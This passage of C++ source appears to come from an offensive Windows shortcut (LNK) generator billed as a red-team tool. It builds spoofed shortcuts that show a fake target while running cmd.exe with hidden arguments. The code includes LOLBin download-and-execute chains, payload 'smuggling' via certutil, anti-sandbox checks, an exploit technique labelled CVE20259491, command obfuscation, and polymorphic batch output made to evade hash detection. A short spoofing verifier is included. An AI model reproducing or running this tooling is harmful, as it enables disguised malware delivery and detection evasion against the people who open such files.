    [[nodiscard]] static std::vector<uint8_t> genLolBinChain(const LnkGenParams& p) {
        LnkGenParams modified = p;

        std::string command;
        if (!p.downloadUrl.empty()) {
            command = lolbin::buildDownloadAndExecute(p.downloadUrl,
                                                       p.outputFilename.empty() ? "update.exe" : p.outputFilename,
                                                       p.lolbinMethod);
        } else if (!p.targetArgs.empty()) {
            std::map<std::string, std::string> params;
            params["base64_payload"] = p.targetArgs;
            params["url"] = p.targetArgs;
            params["command"] = p.targetArgs;
            command = lolbin::buildLolBinCommand(p.lolbinMethod, params);
        } else {
            command = p.targetExe;
        }

        // Aplicar ofuscacion si esta habilitada
        if (p.useObfuscation) {
            command = envobf::obfuscate(command, p.obfuscationMethod);
        }

        modified.targetArgs = command;
        modified.targetExe = "cmd.exe";
        modified.fakePath = p.fakePath.empty() ? "C:\\Windows\\System32\\cmd.exe" : p.fakePath;

        return genSpoofExeShowArgs(modified);
    }

    // NUEVA: File Smuggling
    [[nodiscard]] static std::vector<uint8_t> genFileSmuggling(const LnkGenParams& p) {
        LnkGenParams modified = p;

        std::string command = smuggling::buildFullSmugglingChain(
            p.downloadUrl,
            p.outputFilename.empty() ? "payload.exe" : p.outputFilename,
            smuggling::Transport::CERTUTIL,
            p.antiSandboxDelay
        );

        if (p.useObfuscation) {
            command = envobf::obfuscate(command, p.obfuscationMethod);
        }

        modified.targetArgs = command;
        modified.targetExe = "cmd.exe";
        modified.fakePath = p.fakePath.empty() ?
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" : p.fakePath;

        return genSpoofExeShowArgs(modified);
    }

    // NUEVA: Anti-Sandbox
    [[nodiscard]] static std::vector<uint8_t> genAntiSandbox(const LnkGenParams& p) {
        LnkGenParams modified = p;

        std::string payloadCommand = p.targetExe;
        if (!p.targetArgs.empty()) {
            payloadCommand += " " + p.targetArgs;
        }

        std::string safeCommand = antisandbox::generateAntiSandboxScript(payloadCommand);

        modified.targetArgs = safeCommand;
        modified.targetExe = "cmd.exe";
        modified.fakePath = p.fakePath.empty() ? "C:\\Windows\\System32\\cmd.exe" : p.fakePath;

        return genSpoofExeShowArgs(modified);
    }
};

// =============================================================================
// SECCION 13: Analizadores de LNK
// =============================================================================
struct LnkAnalysisResult {
    std::string displayedTarget;
    std::string executedTarget;
    std::string arguments;
    bool mismatch = false;
    bool success = false;
    std::string error;
};

class ComLnkAnalyzer {
public:
    static LnkAnalysisResult analyze(const std::string& lnkPath) {
        LnkAnalysisResult result;

        try {
            core::ComInitializer comInit(COINIT_MULTITHREADED);
            if (!comInit) {
                result.error = "CoInitializeEx failed";
                return result;
            }

            core::ComPtr<IShellLink> psl;
            HRESULT hr = psl.createInstance(CLSID_ShellLink);
            if (FAILED(hr)) {
                result.error = "CoCreateInstance failed";
                return result;
            }

            core::ComPtr<IPersistFile> ppf;
            hr = psl->QueryInterface(IID_IPersistFile, reinterpret_cast<void**>(&ppf));
            if (FAILED(hr)) {
                result.error = "QueryInterface failed";
                return result;
            }

            std::wstring wpath(lnkPath.begin(), lnkPath.end());
            hr = ppf->Load(wpath.c_str(), STGM_READ);
            if (FAILED(hr)) {
                result.error = "Load failed";
                return result;
            }

            char rawPath[MAX_PATH] = {};
            WIN32_FIND_DATAA wfdRaw = {};
            hr = psl->GetPath(rawPath, MAX_PATH, &wfdRaw, SLGP_RAWPATH);
            if (FAILED(hr)) {
                hr = psl->GetPath(rawPath, MAX_PATH, &wfdRaw, 0);
                if (FAILED(hr)) {
                    result.error = "GetPath failed";
                    return result;
                }
            }

            char expandedRaw[MAX_PATH] = {};
            ExpandEnvironmentStringsA(rawPath, expandedRaw, MAX_PATH);

            hr = psl->Resolve(nullptr, SLR_NO_UI | SLR_NOUPDATE | SLR_NOLINKINFO);
            if (FAILED(hr)) {
                result.error = "Resolve failed";
                return result;
            }

            char resolvedPath[MAX_PATH] = {};
            WIN32_FIND_DATAA wfdResolved = {};
            hr = psl->GetPath(resolvedPath, MAX_PATH, &wfdResolved, 0);
            if (FAILED(hr)) {
                result.error = "GetPath resolved failed";
                return result;
            }

            char args[MAX_PATH] = {};
            psl->GetArguments(args, MAX_PATH);

            result.displayedTarget = expandedRaw;
            result.executedTarget = resolvedPath;
            result.arguments = args;
            result.mismatch = (_stricmp(resolvedPath, expandedRaw) != 0);
            result.success = true;

        } catch (...) {
            result.error = "Exception during analysis";
        }

        return result;
    }
};

// =============================================================================
// SECCION 14: Fachada LnkCore con Generacion Masiva
// =============================================================================
class LnkCore {
public:
    enum class AnalyzerType { COM, Binary };

    static bool generate(LnkTechnique tech, LnkGenParams params) {
        try {
            LnkGenerator::autoConfigureIcon(params);

            auto data = LnkGenerator::generate(tech, params);

            std::ofstream out(params.outputPath, std::ios::binary);
            if (!out) {
                std::cerr << OBF_STR("[-] Cannot write to: ") << params.outputPath << "\n";
                return false;
            }

            out.write(reinterpret_cast<const char*>(data.data()), data.size());
            core::ByteEncoder::secureClear(data);

            return true;

        } catch (const std::exception& e) {
            std::cerr << OBF_STR("[-] Generation error: ") << e.what() << "\n";
            return false;
        }
    }

    // Generacion masiva polimorfica
    static bool generateBatch(LnkTechnique tech, const LnkGenParams& baseParams,
                               const std::string& outputDir, size_t count) {
        try {
            std::filesystem::create_directories(outputDir);

            polymorph::PolymorphicMutator mutator;
            std::set<std::array<uint8_t, 32>> generatedHashes;

            for (size_t i = 0; i < count; ++i) {
                LnkGenParams params = baseParams;
                params.outputPath = outputDir + "\\shortcut_" + std::to_string(i) + ".lnk";

                LnkGenerator::autoConfigureIcon(params);

                auto data = LnkGenerator::generate(tech, params);

                // Aplicar mutaciones
                mutator.addTrailingPadding(data, 16, 128);

                auto hash = polymorph::simpleHash(data);
                if (generatedHashes.find(hash) != generatedHashes.end()) {
                    // Colision, regenerar
                    --i;
                    continue;
                }
                generatedHashes.insert(hash);

                std::ofstream out(params.outputPath, std::ios::binary);
                if (!out) continue;

                out.write(reinterpret_cast<const char*>(data.data()), data.size());
            }

            return true;

        } catch (const std::exception& e) {
            std::cerr << OBF_STR("[-] Batch generation error: ") << e.what() << "\n";
            return false;
        }
    }

    static LnkAnalysisResult verify(const std::string& lnkPath) {
        return ComLnkAnalyzer::analyze(lnkPath);
    }
};

// =============================================================================
// SECCION 15: CLI
// =============================================================================
void printUsage(const char* progName) {
    std::cout << OBF_STR(
        "LNK Tool v4.0 - Professional LNK Generator/Verifier (Red Team)\n"
        "\n"
        "USAGE:\n"
        "  Generate: lnk_tool generate <technique> --target <exe> [options]\n"
        "  Batch:    lnk_tool batch <technique> --target <exe> --count <n> --dir <output_dir>\n"
        "  Verify:   lnk_tool verify <file.lnk>\n"
        "\n"
        "TECHNIQUES:\n"
        "  SPOOFEXE_SHOWARGS_ENABLETARGET    - Show fake, execute real (args visible)\n"
        "  REALEXE_HIDEARGS_DISABLETARGET    - Execute real, hide args, disable target\n"
        "  SPOOFEXE_OVERFLOWARGS_DISABLETARGET - Overflow IDList + network LinkInfo\n"
        "  SPOOFEXE_HIDEARGS_DISABLETARGET   - Show fake, hide args (empty UnicodeTarget)\n"
        "  CVE20259491                       - Padding with \\n\\r\n"
        "  LOLBIN_CHAIN                      - LOLBin execution chain\n"
        "  FILE_SMUGGLING                    - Download + execute + cleanup\n"
        "  ANTI_SANDBOX                      - Sandbox detection + conditional execution\n"
        "\n"
        "OPTIONS:\n"
        "  --target <path>     Real executable to run\n"
        "  --fake <path>       Fake path to show in properties\n"
        "  --args <args>       Arguments for the executable\n"
        "  --icon <path>       Icon location (auto-detected if not specified)\n"
        "  --iconidx <n>       Icon index (auto-detected if not specified)\n"
        "  --out <file>        Output file (default: shortcut.lnk)\n"
        "  --url <url>         URL for download/smuggling techniques\n"
        "  --lolbin <name>     LOLBin method (certutil, bitsadmin, powershell, etc.)\n"
        "  --delay <seconds>   Delay before execution\n"
        "  --obfuscate <1-3>   Obfuscation method (1=char fragment, 2=env sub, 3=reverse)\n"
        "  --no-icon-spoof     Disable automatic icon detection\n"
    ) << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printUsage(argv[0]);
        return 1;
    }

    std::string mode = argv[1];

    try {
        if (mode == "generate" && argc >= 4) {
            LnkGenParams params;
            std::string technique;
            LnkTechnique tech;

            params.iconPath = "";
            params.iconIndex = 0;
            params.outputPath = "shortcut.lnk";
            params.useIconSpoofing = true;

            for (int i = 2; i < argc; ++i) {
                std::string arg = argv[i];

                if (arg == "--target" && i + 1 < argc) {
                    params.targetExe = argv[++i];
                } else if (arg == "--fake" && i + 1 < argc) {
                    params.fakePath = argv[++i];
                } else if (arg == "--args" && i + 1 < argc) {
                    params.targetArgs = argv[++i];
                } else if (arg == "--icon" && i + 1 < argc) {
                    params.iconPath = argv[++i];
                } else if (arg == "--iconidx" && i + 1 < argc) {
                    params.iconIndex = std::stoul(argv[++i]);
                } else if (arg == "--out" && i + 1 < argc) {
                    params.outputPath = argv[++i];
                } else if (arg == "--url" && i + 1 < argc) {
                    params.downloadUrl = argv[++i];
                } else if (arg == "--lolbin" && i + 1 < argc) {
                    params.lolbinMethod = argv[++i];
                } else if (arg == "--delay" && i + 1 < argc) {
                    params.antiSandboxDelay = std::stoi(argv[++i]);
                } else if (arg == "--obfuscate" && i + 1 < argc) {
                    params.obfuscationMethod = std::stoi(argv[++i]);
                    params.useObfuscation = true;
                } else if (arg == "--no-icon-spoof") {
                    params.useIconSpoofing = false;
                } else if (technique.empty() && arg[0] != '-') {
                    technique = arg;
                }
            }

            // Mapear tecnica
            if (technique == "SPOOFEXE_SHOWARGS_ENABLETARGET") {
                tech = LnkTechnique::SPOOFEXE_SHOWARGS_ENABLETARGET;
            } else if (technique == "REALEXE_HIDEARGS_DISABLETARGET") {
                tech = LnkTechnique::REALEXE_HIDEARGS_DISABLETARGET;
            } else if (technique == "SPOOFEXE_OVERFLOWARGS_DISABLETARGET") {
                tech = LnkTechnique::SPOOFEXE_OVERFLOWARGS_DISABLETARGET;
            } else if (technique == "SPOOFEXE_HIDEARGS_DISABLETARGET") {
                tech = LnkTechnique::SPOOFEXE_HIDEARGS_DISABLETARGET;
            } else if (technique == "CVE20259491") {
                tech = LnkTechnique::CVE20259491;
            } else if (technique == "LOLBIN_CHAIN") {
                tech = LnkTechnique::LOLBIN_CHAIN;
            } else if (technique == "FILE_SMUGGLING") {
                tech = LnkTechnique::FILE_SMUGGLING;
            } else if (technique == "ANTI_SANDBOX") {
                tech = LnkTechnique::ANTI_SANDBOX;
            } else {
                std::cerr << OBF_STR("[-] Unknown technique: ") << technique << "\n";
                return 1;
            }

            std::cout << OBF_STR("[+] Generating LNK with technique: ") << technique << "\n";

            if (LnkCore::generate(tech, params)) {
                std::cout << OBF_STR("[+] Generated: ") << params.outputPath << "\n";

                std::ifstream f(params.outputPath, std::ios::binary);
                std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(f)),
                                               std::istreambuf_iterator<char>());
                std::cout << OBF_STR("[+] Size: ") << fileData.size() << OBF_STR(" bytes\n");
                std::cout << OBF_STR("[+] CRC32: 0x") << std::hex << std::setw(8)
                          << std::setfill('0') << core::ByteEncoder::crc32(fileData)
                          << std::dec << "\n";

                return 0;
            }
            return 1;

        } else if (mode == "batch" && argc >= 6) {
            std::string technique;
            LnkTechnique tech;
            LnkGenParams params;
            size_t count = 1;
            std::string outputDir = "output";

            params.useIconSpoofing = true;

            for (int i = 2; i < argc; ++i) {
                std::string arg = argv[i];

                if (arg == "--target" && i + 1 < argc) {
                    params.targetExe = argv[++i];
                } else if (arg == "--fake" && i + 1 < argc) {
                    params.fakePath = argv[++i];
                } else if (arg == "--args" && i + 1 < argc) {
                    params.targetArgs = argv[++i];
                } else if (arg == "--count" && i + 1 < argc) {
                    count = std::stoul(argv[++i]);
                } else if (arg == "--dir" && i + 1 < argc) {
                    outputDir = argv[++i];
                } else if (technique.empty() && arg[0] != '-') {
                    technique = arg;
                }
            }

            // Mapear tecnica basico
            if (technique == "SPOOFEXE_SHOWARGS_ENABLETARGET") {
                tech = LnkTechnique::SPOOFEXE_SHOWARGS_ENABLETARGET;
            } else {
                tech = LnkTechnique::SPOOFEXE_SHOWARGS_ENABLETARGET;
            }

            std::cout << OBF_STR("[+] Generating ") << count << OBF_STR(" polymorphic LNK files...\n");

            if (LnkCore::generateBatch(tech, params, outputDir, count)) {
                std::cout << OBF_STR("[+] Batch generation complete: ") << outputDir << "\n";
                return 0;
            }
            return 1;

        } else if (mode == "verify" && argc >= 3) {
            std::string lnkFile = argv[2];

            std::cout << OBF_STR("[+] Analyzing: ") << lnkFile << "\n";

            auto result = LnkCore::verify(lnkFile);

            if (result.success) {
                std::cout << "\n" << OBF_STR("[ANALYSIS RESULT]") << "\n";
                std::cout << OBF_STR("  Displayed target:  ") << result.displayedTarget << "\n";
                std::cout << OBF_STR("  Executed target:   ") << result.executedTarget << "\n";
                std::cout << OBF_STR("  Arguments:         ") << result.arguments << "\n";
                std::cout << OBF_STR("  Mismatch:          ") << (result.mismatch ? "YES" : "NO") << "\n";

                if (result.mismatch) {
                    std::cout << "\n" << OBF_STR("[!] WARNING: Potential LNK spoofing detected!") << "\n";
                    return 1;
                }
                std::cout << "\n" << OBF_STR("[+] Verification OK") << "\n";
                return 0;
            }

            std::cerr << OBF_STR("[-] Analysis error: ") << result.error << "\n";
            return 1;

        } else {
            printUsage(argv[0]);
            return 1;
        }

    } catch (const std::exception& e) {
        std::cerr << OBF_STR("[-] Error: ") << e.what() << "\n";
        return -1;
    }
}
